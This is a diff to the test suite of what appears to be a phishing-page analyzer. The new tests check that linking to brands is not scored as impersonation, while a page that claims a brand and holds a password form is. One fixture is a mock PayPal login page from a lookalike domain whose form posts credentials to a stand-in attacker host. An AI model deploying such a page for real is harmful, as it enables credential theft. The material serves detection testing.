@@ -128,7 +128,7 @@ def test_digest_surfaces_the_security_relevant_structure():
     assert "forms: 1" in digest
     assert "[external]" in digest, "a form posting to another domain is the key signal"
     assert "password" in digest
-    assert "brands_mentioned: paypal" in digest
+    assert "brands_claimed: paypal" in digest, "the title claims the brand, so it is a claim"
     assert "iframes: 1" in digest
     assert "meta_refresh: yes" in digest
 
@@ -151,6 +151,71 @@ def test_digest_is_bounded_by_max_chars():
 def test_digest_handles_empty_and_junk_input():
     assert build_llm_page_digest("", "https://example.com/") == ""
     assert build_llm_page_digest("<html></html>", "https://example.com/").startswith("page_url:")
+
+
+# --------------------------------------------------------------------------- #
+# Brand impersonation is a claim, not a mention
+#
+# Any occurrence of a brand name used to score. That flagged every legitimate
+# page which links to other companies — github.com/login scored 48/100
+# SUSPICIOUS because it mentions "google", "microsoft" and "amazon" in its SSO
+# buttons and footer.
+# --------------------------------------------------------------------------- #
+
+
+_SSO_PAGE = """
+<html><head><title>Sign in to GitHub</title></head><body>
+  <h1>Sign in to GitHub</h1>
+  <form action="/session">
+    <input type="text" name="login">
+    <input type="password" name="password">
+  </form>
+  <a href="https://accounts.google.com">Sign in with Google</a>
+  <a href="https://login.microsoftonline.com">Sign in with Microsoft</a>
+  <footer>&copy; GitHub, Inc. Amazon Web Services is our host.</footer>
+</body></html>
+"""
+
+_FAKE_PAYPAL = """
+<html><head><title>Sign in to your PayPal account</title></head><body>
+  <h1>PayPal</h1>
+  <form action="https://collect.evil.top/post">
+    <input type="text" name="email">
+    <input type="password" name="password">
+  </form>
+</body></html>
+"""
+
+
+def test_merely_linking_to_brands_is_not_impersonation():
+    from app.analyzers.webpage.analyzer import analyze_html
+
+    evidence = analyze_html(_SSO_PAGE, "https://github.com/login")
+
+    assert evidence.details["brand_mentions"], "the mentions are still recorded"
+    assert evidence.details["brands_claimed"] == [], "a link is not a claim"
+    assert evidence.details["brand_domain_mismatch"] is False
+    assert not any("presents itself as" in i for i in evidence.indicators)
+
+
+def test_a_credential_form_that_claims_a_brand_is_impersonation():
+    from app.analyzers.webpage.analyzer import analyze_html
+
+    evidence = analyze_html(_FAKE_PAYPAL, "https://paypa1-login.top/session")
+
+    assert evidence.details["brands_claimed"] == ["paypal"]
+    assert evidence.details["brand_domain_mismatch"] is True
+    assert any("presents itself as" in i for i in evidence.indicators)
+
+
+def test_a_claim_without_a_credential_form_is_not_impersonation():
+    from app.analyzers.webpage.analyzer import analyze_html
+
+    article = '<html><head><title>PayPal history</title></head><body><p>An article about PayPal.</p></body></html>'
+
+    evidence = analyze_html(article, "https://en.wikipedia.org/wiki/PayPal")
+
+    assert evidence.details["brand_domain_mismatch"] is False
 
 
 def test_digest_marks_a_same_domain_form_as_internal():
